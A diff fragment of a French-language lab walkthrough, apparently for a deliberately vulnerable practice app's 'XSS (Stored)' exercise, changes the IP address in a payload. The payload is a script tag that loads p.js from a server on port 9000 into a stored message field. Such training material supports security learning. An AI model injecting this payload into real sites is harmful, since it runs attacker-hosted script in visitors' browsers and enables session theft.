@@ -208,7 +208,7 @@ curl -I http://localhost:9000/p.js
 1. Aller dans **XSS (Stored)**
 2. Dans le champ **Message**, saisir ce payload (moins de 50 caractères) :
 ```html
-<script src=//10.20.204.87:9000/p.js></script>
+<script src=//192.168.0.109:9000/p.js></script>
 ```
 3. Soumettre le formulaire
 4. Recharger la page
